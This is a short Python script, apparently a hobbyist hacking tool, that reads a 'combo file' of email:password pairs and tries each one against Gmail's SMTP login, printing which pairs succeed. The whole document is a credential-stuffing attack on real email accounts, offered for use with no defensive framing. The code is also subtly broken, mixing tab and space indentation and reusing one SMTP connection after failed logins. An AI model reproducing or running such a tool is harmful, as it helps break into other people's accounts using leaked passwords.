  
#!/usr/bin/python

import smtplib
import re
from termcolor import colored

smtpserver = smtplib.SMTP("smtp.gmail.com",587)
smtpserver.ehlo()
smtpserver.starttls()

combofile = raw_input("[*] Enter The Path To The Combo File:")
combofile = open(combofile, "r")



for combo in combofile:
	combo = combo.strip('\n')
	x = re.split(":", combo)
	username = x[0]
	password = x[1]
    	try:
        	smtpserver.login(username,password)
        	print(colored("[+] Email %s Password Fount: %s" % (username,password), 'green'))
    	except smtplib.SMTPAuthenticationError:
        	print(colored("[-] Wrong Email %s And Password: %s" % (username,password), 'red'))
		
